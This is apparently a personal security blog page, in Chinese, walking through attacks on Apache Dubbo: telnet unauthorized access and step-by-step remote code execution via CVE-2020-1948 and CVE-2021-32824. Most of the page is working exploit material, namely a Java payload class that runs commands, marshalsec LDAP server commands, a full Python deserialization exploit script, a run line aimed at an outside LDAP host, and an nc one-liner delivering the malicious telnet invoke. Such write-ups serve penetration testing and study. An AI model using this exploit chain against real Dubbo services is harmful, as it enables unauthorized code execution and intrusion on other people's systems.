@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Dubbo - ConsT27's Blog</title>
+    <link href="../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Dubbo", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+              {title: "telnet", url: "#telnet" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../ECShop/ECShop/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../ECShop/ECShop/" class="btn btn-xs btn-link">
+        ECShop
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E6%A1%86%E6%9E%B6/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E6%A1%86%E6%9E%B6/" class="btn btn-xs btn-link">
+        框架
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="dubbo">Dubbo</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#telnet">telnet</a><ul>
+<li><a href="#nmap探测端口">nmap探测端口</a></li>
+<li><a href="#telnet-未授权访问">telnet 未授权访问</a></li>
+<li><a href="#cve-2020-1948">cve-2020-1948</a></li>
+<li><a href="#Apache-Dubbo-Telnet-handler-代码执行CVE-2021-32824">Apache Dubbo Telnet handler 代码执行（CVE-2021-32824）</a></li>
+</ul>
+</li>
+</ul>
+<p>阿里巴巴开源的java RPC框架，和RMI是一种类型的框架。</p>
+<p><img alt="" src="../image/image_5H93DkaQP1.png" /></p>
+<h2 id="telnet">telnet</h2>
+<h3 id="nmap">nmap探测端口</h3>
+<p>记得用-sV参数，才会探测指纹</p>
+<p><img alt="" src="../image/image_MDx1hz-OoF.png" /></p>
+<p>Alibaba Dubbo remoting telnetd是Dubbo框架中的一个组件，它提供了通过telnet命令进行服务治理的功能。从Dubbo 2.0.5版本开始，Dubbo开始支持通过telnet命令来进行服务治理。</p>
+<h3 id="telnet_1">telnet 未授权访问</h3>
+<p>telnet ip host</p>
+<p>命令手册：<a href="https://cn.dubbo.apache.org/zh-cn/docs/references/telnet/" title="https://cn.dubbo.apache.org/zh-cn/docs/references/telnet/">https://cn.dubbo.apache.org/zh-cn/docs/references/telnet/</a></p>
+<p>但容易遇到被拦。
+因为需要添加配置</p>
+<p>需要在dubbo provider中配置：</p>
+<pre><code class="language-纯文本">dubbo.provider.telnet = ls,ps,cd,pwd,trace,count,invoke,select,status,log,help,clear,exit,shutdown  
+</code></pre>
+<p><code>ls,ps,cd,pwd,trace,count,invoke,select,status,log,help,clear,exit,shutdown</code>为需要启用的telnet指令，按需添加即可</p>
+<h3 id="cve-2020-1948">cve-2020-1948</h3>
+<p>“好像不用知道consumer的名称就能直接开打，具体是怎样还得调代码，咕咕“</p>
+<p>如果系统开启了dubbo端口（如1.2.3.4:12345），攻击者使用python模拟dubbo通信协议发送rpc请求，数据包含带有无法识别的服务名称service_nam或方法名称method_name，及恶意参数（JdbcRowSetImpl等），在反序列化这些恶意参数时便会触发JNDI注入，导致执行任意恶意代码。</p>
+<p>因此攻击难度较低，但攻击危害很大。</p>
+<pre><code class="language-纯文本">Versions Affected:
+Dubbo 2.7.0 to 2.7.6
+Dubbo 2.6.0 to 2.6.7
+Dubbo all 2.5.x versions (not supported by official team any longer)
+</code></pre>
+<p>1.编写exp.java，用dnslog检测</p>
+<pre><code class="language-纯文本">import javax.naming.Context;
+import javax.naming.Name;
+import javax.naming.spi.ObjectFactory;
+import java.util.Hashtable;
+
+public class exp {
+    public exp(){
+        try {
+            java.lang.Runtime.getRuntime().exec(&quot;ping tt.d3f051053d.ipv6.1433.eu.org&quot;);
+        } catch (java.io.IOException e) {
+            e.printStackTrace();
+        }
+    }
+}
+</code></pre>
+<p>2.编译java，得到exp.class</p>
+<pre><code class="language-纯文本">javac exp.java
+</code></pre>
+<p>3.下载marshalsec并编译成jar，<a href="https://github.com/mbechler/marshalsec" title="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p>
+<p>4.用python起一个http服务，并把exp.class放到http目录下</p>
+<pre><code class="language-纯文本">python -m SimpleHTTPServer 80
+</code></pre>
+<p>5.用marshalsec开启ldap</p>
+<pre><code class="language-纯文本">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.31.153/#exp 777
+</code></pre>
+<p>6.python安装dubbo库</p>
+<pre><code class="language-纯文本"> pip3 install dubbo-py
+</code></pre>
+<p>7.攻击脚本</p>
+<pre><code class="language-纯文本"># -*- coding: utf-8 -*-
+
+import sys
+
+from dubbo.codec.hessian2 import Decoder,new_object
+from dubbo.client import DubboClient
+
+if len(sys.argv) &lt; 4:
+  print('Usage: python {} DUBBO_HOST DUBBO_PORT LDAP_URL'.format(sys.argv[0]))
+  print('\nExample:\n\n- python {} 1.1.1.1 12345 ldap://1.1.1.6:80/exp'.format(sys.argv[0]))
+  sys.exit()
+
+client = DubboClient(sys.argv[1], int(sys.argv[2]))
+
+JdbcRowSetImpl=new_object(
+  'com.sun.rowset.JdbcRowSetImpl',
+  dataSource=sys.argv[3],
+  strMatchColumns=[&quot;foo&quot;]
+  )
+JdbcRowSetImplClass=new_object(
+  'java.lang.Class',
+  name=&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
+  )
+toStringBean=new_object(
+  'com.rometools.rome.feed.impl.ToStringBean',
+  beanClass=JdbcRowSetImplClass,
+  obj=JdbcRowSetImpl
+  )
+
+resp = client.send_request_and_return_response(
+  service_name='org.apache.dubbo.spring.boot.sample.consumer.DemoService',
+  # 此处可以是 $invoke、$invokeSync、$echo 等，通杀 2.7.7 及 CVE 公布的所有版本。
+  method_name='$invoke',
+  args=[toStringBean])
+
+output = str(resp)
+if 'Fail to decode request due to: RpcInvocation' in output:
+  print('[!] Target maybe not support deserialization.')
+elif 'EXCEPTION: Could not complete class com.sun.rowset.JdbcRowSetImpl.toString()' in output:
+   print('[+] Succeed.')
+else:
+  print('[!] Output:')
+  print(output)
+  print('[!] Target maybe not use dubbo-remoting library.')
+</code></pre>
+<pre><code class="language-纯文本">python3 Dubbo.py 192.168.137.173 12345 ldap://139.9.198.30:777/calc
+
+</code></pre>
+<h3 id="apache-dubbo-telnet-handler-cve-2021-32824"><strong>Apache Dubbo Telnet handler 代码执行（CVE-2021-32824）</strong></h3>
+<p>"前提，telnet能执行命令，且要知道dubbo 的一个provider类以及其方法和参数个数，如下例子便是调用了一个三参数的方法“</p>
+<p>telnet连上，能执行命令直接干</p>
+<pre><code class="language-纯文本">invoke [provider_interface].[method_name]({'class':'org.apache.xbean.propertyeditor.JndiConverter','asText':'ldap://{dns_log}/#FoolBoy'},'test','test'})
+</code></pre>
+<p>具体操作</p>
+<p>1.Exploit.java，编译，并把class放到http服务目录</p>
+<pre><code class="language-纯文本">public class Exploit {
+    public Exploit(){
+        try{
+            Runtime.getRuntime().exec(&quot;/bin/bash -c /System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;);
+        }catch(Exception e){
+            e.printStackTrace();
+        }
+    }
+    public static void main(String[] argv){
+        Exploit e = new Exploit();
+    }
+}
+</code></pre>
+<pre><code class="language-纯文本">javac Exploit.java
+</code></pre>
+<pre><code class="language-纯文本">python3 -m http.server 8080
+</code></pre>
+<p>2.marshalsec起一个恶意ldap 服务器</p>
+<pre><code class="language-纯文本">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://127.0.0.1:8080/#Exploit&quot;
+
+</code></pre>
+<p>3连上telnet直接开干</p>
+<pre><code class="language-纯文本">echo &quot;invoke org.apache.dubbo.samples.basic.api.DemoService.sayHello({'class':'org.apache.xbean.propertyeditor.JndiConverter','asText': 'ldap://127.0.0.1:1389/Exploit'})&quot; | nc -i 1 127.0.0.1 20880
+</code></pre>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../ECShop/ECShop/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../ECShop/ECShop/" class="btn btn-xs btn-link">
+        ECShop
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E6%A1%86%E6%9E%B6/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E6%A1%86%E6%9E%B6/" class="btn btn-xs btn-link">
+        框架
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
